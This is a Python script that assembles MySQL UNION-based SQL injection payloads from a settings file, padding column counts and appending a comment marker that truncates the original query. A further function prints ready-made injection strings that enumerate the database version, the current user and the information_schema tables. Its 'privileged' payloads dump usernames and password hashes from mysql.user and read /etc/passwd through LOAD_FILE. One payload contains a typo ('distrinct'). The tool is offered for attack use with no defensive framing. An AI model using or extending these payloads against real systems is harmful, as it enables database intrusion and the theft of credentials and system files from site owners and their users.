import sys


def gather():

    if len(sys.argv) < 2:
        file = open("example.txt")
    else:
        file = open(sys.argv[1])

    
    elements = {"beginning":"","numbering":1,"numbering2":1,"columns":[],'table':"","where":[],"where_entries":{}}

    beg = False
    num = False
    num2 = False
    col = False
    tbl = False
    whe = False
    ent = False


    for line in file:

        line = line.rstrip("\n")

        if "BEGINNING:" in line:
            beg = True
        elif "NUMBERING" in line:
            beg = False
            num = True
        elif "SECOND NUM" in line:
            num = False
            num2 = True
        elif "COLUMN NAME(S):" in line:
            num2 = False
            col = True
        elif "TABLE NAME" in line:
            tbl = True
            col = False
        elif "WHERE" in line:
            tbl = False
            whe = True
        elif "ENTRIES" in line:
            whe = False
            ent = True

        if beg == True and ":" not in line:
            elements['beginning'] = line
        if num == True and ":" not in line:
            elements['numbering'] = int(line)
        if num2 == True and ":" not in line:
            elements['numbering2'] = int(line)
        elif col == True and ":" not in line:
            elements['columns'] = line.split(",")
        elif tbl == True and ":" not in line:
            elements['table'] = line
        elif whe == True and ":" not in line:
            where = line
            elements['where'].append(where)
        elif ent == True and ":" not in line:
            elements['where_entries'][where] = line.split(",")

    return elements

def createStatement(elements):
    beginning = elements['beginning']
    numbering = elements['numbering']
    numbering2 = elements['numbering2']
    columns = elements['columns']
    table = elements['table']
    where = elements['where']
 
    statement = beginning + "UNION SELECT " 
    for i in range(numbering):
        statement += str(i+1) + "," 
    
    for column in elements['columns']:
        statement += column
        statement += ","
    
    for i in range(numbering+len(columns),numbering2):
        statement += str(i+1) + ","
    statement = statement.rstrip(",")    

    statement += " FROM " + table
    

    if len(elements['where']):
        statement += " WHERE " 
        for where in elements['where']:
            statement += where + " NOT IN ("
            for item in elements['where_entries'][where]:
                statement += '\"' + item + '\"' + ","
            statement = statement.rstrip(",")
            statement += ") AND "
        statement = statement.rstrip(" AND ")


    statement = statement.rstrip(",")

    statement += "-- word"
    return statement

def initialQueries(elements):
    beginning = elements['beginning']
    numbering = elements['numbering']

    print("queries:")
    queries = ['@@version',
    'user()',
    'database()',
    "table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'",
    "table_schema, table_name FROM information_schema.columns WHERE column_name = 'username'"]
    
    for item in queries:
        statement = beginning + "UNION SELECT "
        for i in range(numbering):
            statement += str(i+1) + ","
        statement += item
        statement += "-- word"
        print(statement)

    print("privileged queries:")
    priv_queries = ['host,user,password FROM mysql.user','distrinct(db) FROM mysql.db',"LOAD_FILE('/etc/passwd')"]
    for item in priv_queries:
        statement = beginning + "UNION SELECT "
        for i in range(numbering):
            statement += str(i+1) + ","
        statement += item
        statement += "-- word"
        print(statement)


def main():
    elements = gather()
    statement = createStatement(elements)
    print(statement)
    #initialQueries(elements)


main()
